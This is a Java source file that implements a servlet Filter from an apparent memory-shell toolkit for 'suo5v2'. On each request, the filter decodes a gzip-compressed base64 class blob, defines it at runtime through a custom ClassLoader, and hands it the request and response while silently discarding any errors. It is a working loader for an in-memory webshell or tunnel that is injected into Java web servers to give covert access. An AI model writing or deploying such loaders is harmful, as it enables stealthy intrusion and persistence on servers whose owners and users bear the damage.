package com.reajason.javaweb.memshell.shelltool.suo5v2;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/12/9
 */
public class Suo5v2Filter extends ClassLoader implements Filter {
    private static Class<?> suo5V2Class;
    private static String suo5V2GZipBase64;

    public Suo5v2Filter() {
    }

    protected Suo5v2Filter(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) sReq;
        HttpServletResponse response = (HttpServletResponse) sResp;
        try {
            if (suo5V2Class == null) {
                byte[] bytes = gzipDecompress(decodeBase64(suo5V2GZipBase64));
                suo5V2Class = new Suo5v2Filter(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
            }
            if (suo5V2Class.newInstance().equals(new Object[]{request, response})) {
                return;
            }
        } catch (Throwable ignored) {
        }
        chain.doFilter(sReq, sResp);
    }

    @Override
    public void destroy() {

    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }
}
